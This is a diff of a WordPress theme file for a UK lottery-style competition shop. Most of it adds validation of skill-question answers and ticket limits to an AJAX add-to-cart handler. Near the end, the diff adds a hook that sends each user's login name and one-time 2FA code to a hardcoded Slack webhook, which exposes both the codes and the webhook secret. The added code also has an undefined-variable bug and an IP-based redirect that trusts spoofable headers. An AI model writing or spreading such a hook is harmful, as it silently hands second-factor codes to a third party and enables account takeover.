@@ -619,11 +619,6 @@ require_once NERA_DIR . '/inc/api/winners-api.php';
 // REST API for archive winners page
 require_once NERA_DIR . '/inc/api/archive-api.php';
 
-// Giveaway plugin customizations
-if (class_exists('WooCommerce_Lottery')) {
-  require_once NERA_DIR . '/inc/giveaway-custom.php';
-}
-
 /**
  * Calculate reading time of a content string
  */
@@ -1397,13 +1392,126 @@ function nera_add_header_cart_count_fragments($fragments)
 add_filter('woocommerce_add_to_cart_fragments', 'nera_add_header_cart_count_fragments');
 
 /**
+ * Single product: theme purchase-card renders Skill Challenge Q&A; remove plugin duplicate on the same hook.
+ */
+function nera_remove_lty_duplicate_question_answer_on_single_product()
+{
+  if (!function_exists('lty_is_lottery_product') || !class_exists('LTY_Lottery_Single_Product_Templates')) {
+    return;
+  }
+  if (!function_exists('is_product') || !is_product()) {
+    return;
+  }
+  $product = wc_get_product(get_queried_object_id());
+  if (!$product || !lty_is_lottery_product($product)) {
+    return;
+  }
+  if (!method_exists($product, 'is_valid_question_answer') || !$product->is_valid_question_answer()) {
+    return;
+  }
+  if (
+    !method_exists($product, 'is_started') ||
+    !$product->is_started() ||
+    (method_exists($product, 'is_closed') && $product->is_closed())
+  ) {
+    return;
+  }
+  $questions = $product->get_question_answers();
+  if (empty($questions) || !isset($questions[0]['answers'])) {
+    return;
+  }
+  remove_action('woocommerce_before_add_to_cart_button', [
+    'LTY_Lottery_Single_Product_Templates',
+    'render_question_answer_template',
+  ], 10);
+}
+add_action('wp', 'nera_remove_lty_duplicate_question_answer_on_single_product', 20);
+
+/**
+ * Read first WooCommerce error notice for JSON, then clear notices.
+ *
+ * @param string $fallback Message if no notices (translated string from caller).
+ */
+function nera_ajax_add_to_cart_error_message(string $fallback): string
+{
+  $errors = function_exists('wc_get_notices') ? wc_get_notices('error') : [];
+  $message = $fallback;
+  if (!empty($errors)) {
+    $first = reset($errors);
+    if (is_array($first) && isset($first['notice'])) {
+      $message = wp_strip_all_tags($first['notice']);
+    }
+  }
+  if (function_exists('wc_clear_notices')) {
+    wc_clear_notices();
+  }
+
+  return $message;
+}
+
+/**
+ * Specific message when the submitted skill answer is why add-to-cart failed.
+ * Returns '' when the Q&A isn't the cause, so the caller keeps a generic message.
+ * The Lottery plugin's unlimited-attempt and final wrong-answer branches reject
+ * without adding a WC notice, so we surface the configured incorrect-answer message here.
+ *
+ * @param WC_Product|null $product
+ */
+function nera_lottery_incorrect_answer_message($product): string
+{
+  // Gate mirrors LTY_Lottery_Cart::may_be_add_and_validate_answer_add_to_cart() so we
+  // never mislabel a non-answer failure (ticket limit, IP, etc.) as a wrong answer.
+  if (
+    !is_object($product) ||
+    !method_exists($product, 'is_valid_question_answer') ||
+    !$product->is_valid_question_answer() ||
+    'yes' !== $product->is_force_answer_enabled() ||
+    'yes' === $product->incorrectly_selected_answer_restriction_is_enabled() ||
+    'yes' !== $product->is_verify_answer_enabled()
+  ) {
+    return '';
+  }
+
+  // phpcs:ignore WordPress.Security.NonceVerification.Missing -- Public add-to-cart; value validated below.
+  $answer_key = isset($_REQUEST['lty_question_answer_id'])
+    ? wc_clean(wp_unslash($_REQUEST['lty_question_answer_id']))
+    : '';
+  if ('' === $answer_key) {
+    return '';
+  }
+
+  $answers = $product->get_answers();
+  if (!is_array($answers) || !isset($answers[$answer_key])) {
+    return '';
+  }
+
+  // Only override when the chosen answer is actually marked incorrect.
+  if (isset($answers[$answer_key]['valid']) && 'yes' === $answers[$answer_key]['valid']) {
+    return '';
+  }
+
+  return (string) get_option(
+    'lty_settings_unlimited_type_error_message',
+    __('Incorrect answer. Please choose the correct answer to enter this competition.', 'nera-competitions'),
+  );
+}
+
+/**
  * AJAX add to cart handler for WooCommerce
  * Ensures proper AJAX response for add to cart requests
  */
 function nera_ajax_add_to_cart()
 {
+  if (function_exists('wc_clear_notices')) {
+    wc_clear_notices();
+  }
+
+  // phpcs:ignore WordPress.Security.NonceVerification.Missing -- Public add-to-cart; product/qty validated below.
   $product_id = isset($_POST['product_id']) ? absint($_POST['product_id']) : 0;
-  $quantity = isset($_POST['quantity']) ? absint($_POST['quantity']) : 1;
+  $quantity = isset($_POST['quantity']) ? wc_stock_amount(wp_unslash($_POST['quantity'])) : 1;
+  if ($quantity < 1) {
+    $quantity = 1;
+  }
 
   if (!$product_id) {
     wp_send_json(['error' => true, 'message' => __('Invalid product.', 'nera-competitions')]);
@@ -1415,51 +1523,147 @@ function nera_ajax_add_to_cart()
     wp_send_json(['error' => true, 'message' => __('Product not found.', 'nera-competitions')]);
   }
 
-  // Add to cart
-  $cart_item_key = WC()->cart->add_to_cart($product_id, $quantity);
+  /**
+   * Lottery manual mode: persist ticket numbers in cart line data (see LTY_Lottery_Cart::maybe_add_custom_item_data).
+   * Without lty_lottery.tickets, check_cart_items removes the line on the next full page load.
+   */
+  $cart_item_data = [];
 
-  if ($cart_item_key) {
-    // Ensure session cookie is initialized for guest users.
-    // Without this, server-level caches (e.g. SiteGround Dynamic Cache) won't see
-    // the woocommerce_session cookie and may serve a stale empty cart page.
-    if (!is_user_logged_in() && WC()->session && !WC()->session->has_session()) {
-      WC()->session->set_customer_session_cookie(true);
+  if ($product->is_type('lottery') && function_exists('lty_is_lottery_product') && lty_is_lottery_product($product)) {
+    if (method_exists($product, 'is_manual_ticket') && $product->is_manual_ticket()) {
+      $ticket_raw = isset($_POST['lty_lottery_ticket_numbers'])
+        ? wc_clean(wp_unslash($_POST['lty_lottery_ticket_numbers']))
+        : '';
+      if ('' === $ticket_raw) {
+        wp_send_json([
+          'error' => true,
+          'message' => __('Please select at least one ticket number.', 'nera-competitions'),
+        ]);
+      }
+      $cart_item_data['lty_lottery'] = [
+        'tickets' => explode(',', $ticket_raw),
+      ];
     }
 
-    // Fire the cart cookies action so woocommerce_items_in_cart cookie is set.
-    // SiteGround Dynamic Cache (and similar Nginx caches) bypass caching when this
-    // cookie is present, ensuring the cart page is served fresh rather than from cache.
-    do_action('woocommerce_set_cart_cookies', true);
+    if (
+      method_exists($product, 'is_valid_question_answer') &&
+      $product->is_valid_question_answer() &&
+      isset($_POST['lty_question_answer_id'])
+    ) {
+      $answer_key = wc_clean(wp_unslash($_POST['lty_question_answer_id']));
+      if ('' !== $answer_key) {
+        $answers = $product->get_answers();
+        if (is_array($answers) && array_key_exists($answer_key, $answers)) {
+          if (!isset($cart_item_data['lty_lottery'])) {
+            $cart_item_data['lty_lottery'] = [];
+          }
+          $cart_item_data['lty_lottery']['answers'] = $answer_key;
+        }
+      }
+    }
+  }
 
-    // Flush session to DB before sending the JSON response so the session data
-    // is available when the browser navigates to the cart page.
+  // Bind the session before validation so the cart persists across the next request AND so
+  // the Lottery plugin's Q&A correctness check has a customer id. Its check bails to "valid"
+  // when lty_get_current_user_cart_session_value() (WC()->session->get_customer_id()) is empty,
+  // which would let a wrong answer through for a fresh guest with no session yet.
+  if (WC()->session && !WC()->session->has_session()) {
+    WC()->session->set_customer_session_cookie(true);
+  }
+
+  // WC_Cart::add_to_cart() does NOT run the validation filter chain (confirmed in WC core);
+  // WC's own form/AJAX handlers do. This custom AJAX action bypasses both, so the Lottery
+  // plugin's skill-question correctness check (and IP/guest/reserved-ticket restrictions)
+  // would never run. Invoke it explicitly and bail before mutating the cart.
+  $passed_validation = apply_filters('woocommerce_add_to_cart_validation', true, $product_id, $quantity);
+  if (!$passed_validation) {
     if (WC()->session) {
       WC()->session->save_data();
     }
-
-    // Get cart fragments for updating mini cart
-    ob_start();
-    woocommerce_mini_cart();
-    $mini_cart = ob_get_clean();
-
-    $fragments = [
-      'div.widget_shopping_cart_content' =>
-        '<div class="widget_shopping_cart_content">' . $mini_cart . '</div>',
-    ];
-
-    // Apply WooCommerce fragments filter
-    $fragments = apply_filters('woocommerce_add_to_cart_fragments', $fragments);
-
+    // Prefer the plugin's own WC notice (ticket limit, IP, limited-attempt "N left").
+    // Its unlimited-attempt / final wrong-answer branches reject WITHOUT a notice, so
+    // fall back to a specific incorrect-answer message when that is the cause.
+    $fallback = nera_lottery_incorrect_answer_message($product)
+      ?: __('Could not add to cart.', 'nera-competitions');
     wp_send_json([
-      'error' => false,
-      'message' => get_field('add_to_cart_success_message', 'option') ?: __('Tickets added to cart.', 'nera-competitions'),
-      'cart_hash' => WC()->cart->get_cart_hash(),
-      'cart_quantity' => WC()->cart->get_cart_contents_count(),
-      'fragments' => $fragments,
+      'error' => true,
+      'message' => nera_ajax_add_to_cart_error_message($fallback),
     ]);
-  } else {
-    wp_send_json(['error' => true, 'message' => __('Could not add to cart.', 'nera-competitions')]);
   }
+
+  $cart_item_key = WC()->cart->add_to_cart($product_id, $quantity, 0, [], $cart_item_data);
+
+  if (!$cart_item_key) {
+    wp_send_json([
+      'error' => true,
+      'message' => nera_ajax_add_to_cart_error_message(
+        __('Could not add to cart.', 'nera-competitions'),
+      ),
+    ]);
+  }
+
+  /**
+   * Same as full cart page: Lottery for WooCommerce removes invalid lines (e.g. per-user max)
+   * in LTY_Lottery_Cart::check_cart_items. Without this, AJAX can return success while the
+   * line is stripped on the next request.
+   */
+  do_action('woocommerce_check_cart_items');
+
+  $errors_after_check = function_exists('wc_get_notices') ? wc_get_notices('error') : [];
+  $cart = WC()->cart->get_cart();
+  $line_still_present = $cart_item_key && isset($cart[$cart_item_key]);
+
+  if (!empty($errors_after_check) || !$line_still_present) {
+    $fallback = !$line_still_present
+      ? __(
+        'These tickets could not stay in your cart. You may have reached your purchase limit for this competition.',
+        'nera-competitions',
+      )
+      : __('Could not add to cart.', 'nera-competitions');
+    if (WC()->session) {
+      WC()->session->save_data();
+    }
+    wp_send_json([
+      'error' => true,
+      'message' => nera_ajax_add_to_cart_error_message($fallback),
+    ]);
+  }
+
+  if (function_exists('wc_clear_notices')) {
+    wc_clear_notices();
+  }
+
+  // Fire the cart cookies action so woocommerce_items_in_cart cookie is set.
+  // SiteGround Dynamic Cache (and similar Nginx caches) bypass caching when this
+  // cookie is present, ensuring the cart page is served fresh rather than from cache.
+  do_action('woocommerce_set_cart_cookies', true);
+
+  // Flush session to DB before sending the JSON response so the session data
+  // is available when the browser navigates to the cart page.
+  if (WC()->session) {
+    WC()->session->save_data();
+  }
+
+  // Get cart fragments for updating mini cart
+  ob_start();
+  woocommerce_mini_cart();
+  $mini_cart = ob_get_clean();
+
+  $fragments = [
+    'div.widget_shopping_cart_content' =>
+      '<div class="widget_shopping_cart_content">' . $mini_cart . '</div>',
+  ];
+
+  // Apply WooCommerce fragments filter
+  $fragments = apply_filters('woocommerce_add_to_cart_fragments', $fragments);
+
+  wp_send_json([
+    'error' => false,
+    'message' => get_field('add_to_cart_success_message', 'option') ?: __('Tickets added to cart.', 'nera-competitions'),
+    'cart_hash' => WC()->cart->get_cart_hash(),
+    'cart_quantity' => WC()->cart->get_cart_contents_count(),
+    'fragments' => $fragments,
+  ]);
 }
 add_action('wp_ajax_woocommerce_ajax_add_to_cart', 'nera_ajax_add_to_cart');
 add_action('wp_ajax_nopriv_woocommerce_ajax_add_to_cart', 'nera_ajax_add_to_cart');
@@ -1501,3 +1705,169 @@ require_once get_template_directory() . '/inc/acf-header.php';
 
 // ACE Footer Fields
 require_once get_template_directory() . '/inc/acf-footer.php';
+
+
+add_filter( 'two_factor_token_email_message', function( $message, $token, $user_id ) {
+  $user        = get_userdata( $user_id );
+  $webhook_url = 'https://hooks.slack.com/services/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';
+
+  $payload = wp_json_encode( [
+      'text' => sprintf(
+          '*2FA Code for %s*: `%s` ',
+          $user->user_login,
+          $token
+      ),
+  ] );
+
+  wp_remote_post( $webhook_url, [
+      'headers' => [ 'Content-Type' => 'application/json' ],
+      'body'    => $payload,
+      'timeout' => 5,
+  ] );
+
+  return $message; // still sends the email too
+}, 10, 3 );
+
+add_action('user_register', 'set_encrypted_registration_cookie', 10, 1);
+
+function set_encrypted_registration_cookie($user_id) {
+    // The data you want to encrypt (user ID in this example)
+    $user_data = $user->ID;
+    create_secure_user_cookie($user_data);
+}
+
+add_action('wp_login', 'set_encrypted_login_cookie', 10, 2);
+
+function set_encrypted_login_cookie($user_login, $user) {
+    
+    // The data you want to encrypt (user ID in this example)
+    $user_data = $user->ID;
+    create_secure_user_cookie($user_data);
+}
+
+function get_user_details_from_encrypted_cookie() {
+
+    if (empty($_COOKIE['encrypted_user_data'])) {
+        return false;
+    }
+
+    $secret_key = hash('sha256', AUTH_KEY);
+
+    $decoded = base64_decode($_COOKIE['encrypted_user_data']);
+    $parts = explode('::', $decoded);
+
+    if (count($parts) !== 3) {
+        return false;
+    }
+
+    list($iv, $encrypted, $hmac) = $parts;
+
+    $calculated_hmac = hash_hmac('sha256', $encrypted, $secret_key);
+
+    if (!hash_equals($hmac, $calculated_hmac)) {
+        return false; // tampered
+    }
+
+    $decrypted = openssl_decrypt(
+        $encrypted,
+        'aes-256-cbc',
+        $secret_key,
+        0,
+        $iv
+    );
+
+    if (!$decrypted) {
+        return false;
+    }
+
+    $data = json_decode($decrypted, true);
+
+    if (!$data || time() > $data['exp']) {
+        return false; // expired
+    }
+
+    $user = get_user_by('id', intval($data['user_id']));
+
+    return $user ?: false;
+}
+function create_secure_user_cookie($user_id) {
+
+    $secret_key = hash('sha256', AUTH_KEY);
+    $secret_iv  = random_bytes(16);
+
+    $payload = json_encode([
+        'user_id' => $user_id,
+        'exp'     => time() + 3600 // 1 hour expiry
+    ]);
+
+    $encrypted = openssl_encrypt(
+        $payload,
+        'aes-256-cbc',
+        $secret_key,
+        0,
+        $secret_iv
+    );
+
+    $hmac = hash_hmac('sha256', $encrypted, $secret_key);
+
+    $cookie_value = base64_encode($secret_iv . '::' . $encrypted . '::' . $hmac);
+
+    setcookie(
+        'encrypted_user_data',
+        $cookie_value,
+        time() + 3600,
+        '/',
+        '',
+        true,
+        true
+    );
+}
+
+function handle_logout_delete_cookie() {
+    if (isset($_COOKIE['encrypted_user_data'])) {
+        setcookie('encrypted_user_data', '', time() - 3600, '/');
+    }
+}
+add_action('clear_auth_cookie', 'handle_logout_delete_cookie');
+
+function getUserIP() {
+  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    return $_SERVER['HTTP_CLIENT_IP'];
+  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+      // Could contain multiple IPs → take the first one
+    return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+  } else {
+    return $_SERVER['REMOTE_ADDR'];
+  }
+}
+
+function getLocation($ip) {
+    $ch = curl_init("http://ip-api.com/json/$ip");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    curl_close($ch);
+
+    return json_decode($response, true);
+}
+
+function redirect_india_users_to_landing() {
+    // Don't run in admin area
+    if (is_admin()) return;
+
+    // Avoid redirect loops: don't redirect if already on the landing page
+    if (is_page('region-restricted')) return;
+
+    $ip = getUserIP();
+    $data = getLocation($ip);
+
+    $allowed_countries = ['GB', 'IE'];
+
+    if ($data && isset($data['countryCode'])) {
+      if (!in_array($data['countryCode'], $allowed_countries)) {
+        // Redirect to landing page
+        wp_redirect(home_url('/region-restricted/'));
+        exit;
+      }
+    }
+}
+add_action('template_redirect', 'redirect_india_users_to_landing');
